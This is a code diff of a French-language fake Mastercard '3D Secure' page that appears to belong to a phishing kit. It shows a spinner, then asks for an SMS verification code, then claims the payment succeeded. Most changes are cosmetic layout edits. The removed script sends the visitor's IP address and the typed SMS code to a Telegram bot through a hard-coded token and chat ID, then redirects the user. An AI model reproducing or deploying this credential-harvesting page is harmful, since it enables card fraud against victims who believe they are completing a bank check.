@@ -28,7 +28,7 @@
     @keyframes spin { 100% { transform: rotate(360deg); } }
     .icon-container img {
       max-width: 2800px;
-      height: 60px;
+      height: 45px;
     }
     .sms-form {
       display: flex;
@@ -60,19 +60,19 @@
 </head>
 <body>
   <div class="payment-container full-widt <center>h-container" id="step-2">
-    <h2>3D SECURE</h2>
+     <center><h2>3D SECURE</h2>
     <div class="icon-container">
-      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+    <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <div class="spinner"></div>
-    <p>VEUILLEZ PATIENTER...</p>
+     <center><p>VEUILLEZ PATIENTER...</p>
   </div>
-  <div class="payment-container full-wi   dth-container hidden" id="step-3">
-  <center><h2>AUTHENTIFICATION SMS</h2>
+  <div class="payment-container full-width-container hidden" id="step-3">
+     <center><h2>AUTHENTIFICATION SMS</h2>
     <div class="icon-container">
- <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+<img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
-    <center><p>Entrez le code reçu par SMS :</p>
+    <p>Entrez le code reçu par SMS :</p>
     <form id="sms-form" class="sms-form">
       <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
       <input type="submit" value="Valider">
@@ -81,15 +81,15 @@
   <div class="payment-container full-width-container hidden" id="step-4">
      <center><h2>3D SECURE</h2>
     <div class="icon-container">
-     <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <div class="spinner"></div>
-    <center><p>VEUILLEZ PATIENTER...</p>
+     <center><p>VEUILLEZ PATIENTER...</p>
   </div>
   <div class="payment-container full-width-container hidden" id="step-5">
-    <<center><h2>PAIEMENT RÉUSSI</center>
+<h2>PAIEMENT RÉUSSI</center>
     <div class="icon-container">
-<img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+       <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <p class="success-message">Redirection dans quelques instants...</p>
   </div>
@@ -135,54 +135,5 @@
       }, 7000);
     });
   </script>
-</body>
-</html>
-
-  <script>
-    function sendToTelegram(message) {
-      const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
-      const TELEGRAM_CHAT_ID = '7747778364';
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    }
-
-    function getUserIP() {
-      fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const userIP = data.ip;
-          sendToTelegram(`Adresse IP détectée : ${userIP}`);
-        })
-        .catch(error => console.error('Erreur récupération IP:', error));
-    }
-
-    setTimeout(() => {
-      document.getElementById('step-2').classList.add('hidden');
-      document.getElementById('step-3').classList.remove('hidden');
-      getUserIP();
-    }, 10000);
-
-    document.getElementById('sms-form').addEventListener('submit', function(event) {
-      event.preventDefault();
-      const smsCode = document.getElementById('sms-code').value;
-      sendToTelegram(`Code SMS reçu : ${smsCode}`);
-      document.getElementById('step-3').classList.add('hidden');
-      document.getElementById('step-4').classList.remove('hidden');
-      
-      setTimeout(() => {
-        document.getElementById('step-4').classList.add('hidden');
-        document.getElementById('step-5').classList.remove('hidden');
-        setTimeout(() => {
-          window.location.href = "https://justmoicom.github.io/test2/";
-        }, 5000);
-      }, 7000);
-    });
-  </script>
-
 </body>
 </html>
